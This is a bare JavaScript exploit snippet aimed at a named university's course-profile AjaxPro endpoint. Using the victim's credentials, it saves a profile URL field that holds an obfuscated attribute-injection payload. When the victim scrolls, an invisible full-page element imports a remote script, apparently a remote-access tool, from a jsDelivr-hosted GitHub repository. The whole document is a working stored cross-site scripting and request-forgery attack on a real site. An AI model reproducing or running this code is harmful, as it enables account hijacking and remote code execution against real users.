(function () {
    const payload = {
        dt: {
            Columns: [
                ["URL", "System.String"],
                ["showURL", "System.Int32"],
                ["showEmail", "System.Int32"],
                ["showPhone", "System.Int32"]
            ],
            Rows: [["#class\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;opacity:0\" onwheel=\"location='j'+'ava'+'scr'+'ipt:import%28%27//cdn.jsdelivr.net/gh/hua9239/rat@master/06b522.js%27%29';this.outerHTML=''", "1", "0", "0"]]
        }
    };

    fetch("https://icas.pccu.edu.tw/cfp/ajaxpro/CourseFP.AjaxMethods,App_Code.ashx", {
        headers: {
            "X-AjaxPro-Method": "SaveProfile"
        },
        "method": "POST",
        "credentials": "include",
        body: JSON.stringify(payload)
    });
})();